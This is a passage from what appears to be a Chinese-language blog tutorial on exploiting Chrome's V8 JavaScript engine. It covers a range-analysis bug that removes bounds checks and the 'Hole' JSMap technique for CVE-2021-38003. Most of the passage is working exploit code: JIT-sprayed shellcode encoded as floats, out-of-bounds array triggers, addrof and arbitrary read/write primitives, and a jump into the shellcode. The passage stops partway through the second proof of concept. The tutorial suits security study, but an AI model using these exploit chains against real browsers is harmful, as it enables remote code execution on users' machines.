class="comment">// namespace v8</span></span><br></pre></td></tr></table></figure></div>
<p>这个优化实际就是常量折叠，例如 <code>x + 1 + 2</code> 可以被优化为 <code>x + 3</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/396b253a6f7d07391ea464da03a86df5.png"
                      alt="在这里插入图片描述"
                ></p>
<p>浮点数中有一个上界 9007199254740992 ，当达到这个数时精度不能保证。例如 <code>9007199254740991 + 1 = 9007199254740992</code> 但是 <code>9007199254740992 + 1 = 9007199254740992</code> ，<code>9007199254740992 + 2 = 9007199254740994</code> 。我们可以通过二分得到这个上界。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> l = <span class="number">0</span>, r = std::numeric_limits&lt;<span class="type">uint64_t</span>&gt;::<span class="built_in">max</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> m = (__int128(l) + r) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">double</span>(m) == <span class="built_in">double</span>(m) + <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">double</span>(l) == <span class="built_in">double</span>(l) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 type lowering 优化位于计算范围的 typer 之后并且位于优化 <code>CheckBounds</code> 的 simplified lowering 之前，因此可以通过上面的特性利用题目添加的优化为 simplified lowering 提供一个错误的范围使得 <code>CheckBounds</code> 被优化掉造成 oob 。</p>
<p>因此有如下 POC ：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7237de6f4b9bdc2deda37409e6db7a10.png"
                      alt="在这里插入图片描述"
                ><br>这里有几个需要注意的问题：</p>
<ul>
<li>需要有一个 <code>x == 1 ? 9007199254740992 : 9007199254740988</code> 条件分枝确保 <code>9007199254740992 + 1 + 1 + 1</code> 优化成 <code>9007199254740992 + 3</code> 而不是 <code>9007199254740992</code> 。</li>
<li><code>9007199254740992 - n - 1</code> 是为了确保加上后面的 n 个 <code>+ 1</code> 不和 <code>9007199254740992</code> 加上后面的 n 个 <code>+ 1</code> 相同，否则会和上面那个情况一样被优化成 <code>9007199254740992</code> 。</li>
</ul>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> oob_array = [<span class="number">.1</span>, <span class="number">.2</span>];</span><br><span class="line">        <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740988</span>) + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">        t -= <span class="number">9007199254740991</span>;</span><br><span class="line">        oob_array[t] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> oob_array;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">foo</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">23</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h1 id="Hole"><a href="#Hole" class="headerlink" title="Hole"></a>Hole</h1><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p><code>Hole</code> 是 JS 内部的一种数据类型，用来标记不存在的元素，与 C++ 中的 <code>nullptr</code>  类似，不过这个数据类型通常是不会泄露至用户。</p>
<p>Hole 类型的漏洞利用是指由于内部数据结构 <code>Hole</code> 通过漏洞被暴露至用户层，因此可以根据 <code>Hole</code> 创建⼀个长度为 -1 的 <code>JSMap</code> 结构，导致越界读写，并造成 RCE。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析可知，当一个元素被从 <code>JSMap</code> 删除的时候 JS 会将该元素对应的 <code>Entry</code> 的 <code>key</code> 和 <code>value</code> 修改为 <code>Hole</code> 。如果我们往 <code>JSMap</code> 中加入一个 <code>key</code> 为 <code>Hole</code> 的元素就可以一直删除 <code>key</code> 为 <code>Hole</code> 的元素。不过实际上由于 shrink 操作会清除 <code>JSMap</code> 中的 <code>Hole</code> 因此需要具体分析。</p>
<p>有如下示例（commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code>）：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure></div>

<p>这里 <code>map.set(1, 1)</code> 的作用是为了确保两次 <code>map.delete(hole)</code> 后才出现 shrink 操作。之后的 <code>map.delete(1)</code> 使得 <code>map.size</code> 变为 -1 。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析以及实际调试可知 <code>JSMap</code> 的关键结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/94d2fd0ea7b951e9588f1ec29419d91e.png"
                      alt="在这里插入图片描述"
                ><br>之后再次向 <code>JSMap</code> 中添加元素。由于 <code>JSMap</code> 中没有待添加元素的 <code>key</code> ，因此会在 <code>elements</code> 中写入新的 <code>Entry</code> 。而新的 <code>Entry</code> 的地址的计算方式是 <code>&amp;buckets + number_of_buckets + (new_number_of_elements + new_number_of_deleted) * 3</code>（统一按照 <code>buckets</code> 元素大小计算）  ，由于经过了 shrink 操作，这三个值分别为：</p>
<ul>
<li><code>number_of_elements</code>: -1</li>
<li><code>number_of_deleted</code>: 0</li>
<li><code>number_of_buckets</code>: 2</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   occupancy = <span class="title class_">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">TNode</span>&lt;<span class="title class_">IntPtrT</span>&gt; entry_start = <span class="title class_">IntPtrAdd</span>(</span><br><span class="line">     <span class="title class_">IntPtrMul</span>(occupancy, <span class="title class_">IntPtrConstant</span>(<span class="title class_">OrderedHashMap</span>::kEntrySize)),</span><br><span class="line">     number_of_buckets);</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, key, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * <span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>());</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, value, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span class="title class_">OrderedHashMap</span>::kValueOffset));</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, bucket_entry,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span class="title class_">OrderedHashMap</span>::kChainOffset));</span><br></pre></td></tr></table></figure></div>
<p>因此 <code>Entry</code> 起始地址等同于 <code>&amp;bucket[-1]</code>，会将 <code>bucket count</code> 覆盖，也就是说我们能够控制 <code>number_of_buckets</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c566a42eab160a162872551db2cc1e6a.png"
                      alt="在这里插入图片描述"
                ><br>当我们拥有控制 <code>number_of_buckets</code> 的能力时，由于新的 <code>Entry</code> 的地址的计算方式是 <code>&amp;buckets + number_of_buckets + new_number_of_elements + new_number_of_deleted</code> ，因此我们可以溢出进行任意地址写。其中一个用法便是修改 <code>JSArray</code> 的 <code>length</code> 实现 OOB 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/eef097251127ec745ec4cc2e5270d715.png"
                      alt="在这里插入图片描述"
                ><br>之后的操作可以参考前面的沙箱逃逸。由于这个版本不容易泄露沙箱基地址，因此这里采用立即数写 shellcode 的方法。另外立即数写 shellcode 的 JIT 过程使得 Hole 的 JSMap 利用过程更加稳定。</p>
<p>另外需要注意的是 <code>JSMap</code> 的 <code>set</code> 操作时如果 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 不为 -1 ，则会在  <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 对应的单向链表中查找 <code>key</code> ，期间会检查链表中的 <code>Entry</code> 是否合法。为了避免出现这一情况，需要满足 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 。调试发现原来的 <code>buckets</code> 范围内的值为 -1 因此只需要满足 <code>ComputeUnseededHash(key) &amp; (buckets - 1) = 0</code> 并且 <code>key</code> 足够大（这里用 <code>key</code> 来覆盖 <code>JsArray</code> 的 <code>length</code>，否则会破坏 <code>JsArray</code> 的结构）。因此有如下爆破脚本。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ComputeUnseededHash</span><span class="params">(<span class="type">uint32_t</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> hash = key;</span><br><span class="line">    hash = ~hash + (hash &lt;&lt; <span class="number">15</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    hash = hash + (hash &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    hash = hash * <span class="number">2057</span>;</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">0x3fffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x300</span>, buckets = <span class="number">0x15</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="built_in">ComputeUnseededHash</span>(key) &amp; (buckets - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        key++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ./d8 --allow-natives-syntax poc.js</span></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span 